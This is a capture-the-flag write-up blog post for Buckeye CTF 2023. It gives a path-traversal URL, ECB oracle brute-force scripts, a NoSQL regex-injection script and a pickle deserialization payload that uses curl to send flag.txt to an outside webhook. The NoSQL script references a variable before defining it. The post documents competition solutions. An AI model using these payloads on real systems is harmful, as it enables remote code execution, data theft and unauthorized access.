---
title: Buckeye CTF 2023
description: I copied this from discord messages I sent
date: 2023-10-02
scheduled: 2023-10-02
tags: ctf
layout: layouts/post.njk
image: https://cdn.pixabay.com/photo/2020/08/30/20/54/rice-field-5530707_1280.jpg
---


## Stray 
I wrote down this was a javascript type pollution LFI

https://stray.chall.pwnoh.io/cat?category[]=../flag.txt

bctf{j4v45cr1p7_15_4_6r347_l4n6u463}


## Electronical 

I did this one in three parts since my script was broken but still solved it. Even the official solution for this one said "solve script doesn't entirely work but mostly"

### Script1
```
import string
import requests

zeros=11
payload="bctf"
while zeros!=0:
    goal=requests.get("https://electronical.chall.pwnoh.io/encrypt?message="+'0'*zeros).text[:32]
    print("Goal = ", goal)
    for char in string.printable:
        print('0'*zeros+payload+char)
        check=requests.get("https://electronical.chall.pwnoh.io/encrypt?message="+'0'*zeros+payload+char).text[:32]
        print("Check = ", check)
        if (check==goal):
            print("Correct")
            payload+=char
            zeros-=1
            break
```

### Script2
```
import string
import requests

zeros=16
payload="bctf{1_c4n7_b3l"
while zeros!=0:
    goal=requests.get("https://electronical.chall.pwnoh.io/encrypt?message="+'0'*zeros).text[32:64]
    print("Goal = ", goal)
    for char in string.printable:
        print('0'*zeros+payload+char)
        check=requests.get("https://electronical.chall.pwnoh.io/encrypt?message="+'0'*zeros+payload+char).text[32:64]
        print("Check = ", check)
        if (check==goal):
            print("Correct")
            payload+=char
            break
    zeros-=1
```

### Script3
```
import string
import requests

zeros=16
payload="bctf{1_c4n7_b3l13v3_u_f0und_my_"
while zeros!=0:
    goal=requests.get("https://electronical.chall.pwnoh.io/encrypt?message="+'0'*zeros).text[64:96]
    print("Goal = ", goal)
    for char in string.printable:
        print('0'*zeros+payload+char)
        check=requests.get("https://electronical.chall.pwnoh.io/encrypt?message="+'0'*zeros+payload+char).text[64:96]
        print("Check = ", check)
        if (check==goal):
            print("Correct")
            payload+=char
            break
    zeros-=1
```

## Area51
Abusing NoSQL injection. See https://portswigger.net/web-security/nosql-injection
```
import requests
import string

success=len(requests.get("https://area51.chall.pwnoh.io/",cookies={"session":"{\"token\":{\"$regex\":\""+password+".*\"}}"}).content)
keyspace=string.ascii_letters+string.digits+"_"+"{"+"}"
password="bctf"
while(password[-1]!='}'):
     for char in keyspace:
             print(password+char)
             if(len(requests.get("https://area51.chall.pwnoh.io/",cookies={"session":"{\"token\":{\"$regex\":\""+password+char+".*\"}}"}).content)==success): 
                 password+=char
                 break
```

## Text Adventure API

Only slightly different from official solution. Save pickle is loaded on the server allowing RCE via python reduce

```
class test:
  def __reduce__(self):
             import subprocess
             return subprocess.check_output, (["curl","-d","@flag.txt","https://webhook.site/d5092a4a-c837-495e-b231-1511bcdaddae"],)
pickle.dump(test(),open('C:/Users/Cramik/Desktop/payload5.pkl','wb'))
```